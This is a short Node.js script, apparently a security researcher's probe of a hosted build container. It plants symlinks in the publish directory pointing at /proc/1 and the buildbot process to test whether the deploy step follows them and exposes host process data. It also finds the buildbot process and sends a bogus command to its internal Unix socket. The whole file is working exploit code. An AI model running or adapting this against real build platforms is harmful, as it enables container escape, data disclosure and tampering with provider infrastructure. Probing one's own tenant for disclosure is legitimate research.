// agentdeep-6 — (1) subdirectory dir-symlink test: does the deploy walker follow a
// dir symlink INSIDE a real publish dir (sublink -> /proc/1, procbb -> /proc/{bb})?
// (2) live deployserver socket protocol probe: bogus action -> capture response.
// Own tenant, own container, bounded.
import fs from 'node:fs';
import net from 'node:net';

const R = { probe: 'agentdeep-6', t: new Date().toISOString() };
const cap = (v, n = 30000) => (typeof v === 'string' && v.length > n ? v.slice(0, n) + '..TRUNC' : v);
const flush = () => { try { fs.writeFileSync('pubdir/agentdeep6.json', JSON.stringify(R, null, 1)); } catch {} };
fs.mkdirSync('pubdir', { recursive: true });

// buildbot pid
let bbPid = null;
try {
  for (const p of fs.readdirSync('/proc').filter((x) => /^\d+$/.test(x))) {
    try { const c = fs.readFileSync(`/proc/${p}/cmdline`, 'utf8'); if (/build-bin\/buildbot/.test(c)) { bbPid = p; break; } } catch {}
  }
} catch {}
R.bbPid = bbPid;
flush();

// 1. dir symlinks INSIDE the real publish dir
R.links = {};
const mk = (name, target) => {
  try { fs.symlinkSync(target, 'pubdir/' + name); R.links[name] = { target, ok: true }; }
  catch (e) { R.links[name] = { target, err: String(e).slice(0, 80) }; }
};
fs.writeFileSync('pubdir/real-control.txt', 'agentdeep-6 ' + new Date().toISOString());
mk('sublink', '/proc/1');
if (bbPid) mk('procbb', '/proc/' + bbPid);
flush();

// what does build uid see under /proc/1?
try { R.proc1Ls = fs.readdirSync('/proc/1').slice(0, 40); } catch (e) { R.proc1Ls = 'ERR ' + String(e).slice(0, 60); }
flush();

// 2. live socket: bogus action
R.socketTest = await new Promise((res) => {
  let settled = false;
  const done = (v) => { if (!settled) { settled = true; res(v); } };
  try {
    const s = net.connect({ path: '/tmp/netlify-buildbot-socket' });
    const t = setTimeout(() => { try { s.destroy(); } catch {} done('TIMEOUT no response'); }, 3500);
    s.on('connect', () => {
      s.write(JSON.stringify({ action: 'bogusAction', deployDir: 'pubdir', environment: [] }));
    });
    s.on('data', (d) => { clearTimeout(t); const v = cap(d.toString('utf8'), 2000); try { s.destroy(); } catch {} done(v); });
    s.on('error', (e) => { clearTimeout(t); done('ERR ' + String(e.code || e)); });
    s.on('close', () => { clearTimeout(t); done('CLOSED no data'); });
  } catch (e) { done('ERR ' + String(e).slice(0, 80)); }
});
flush();

R.done = new Date().toISOString();
flush();
console.log('agentdeep-6 done; socketTest=' + JSON.stringify(R.socketTest).slice(0, 200));
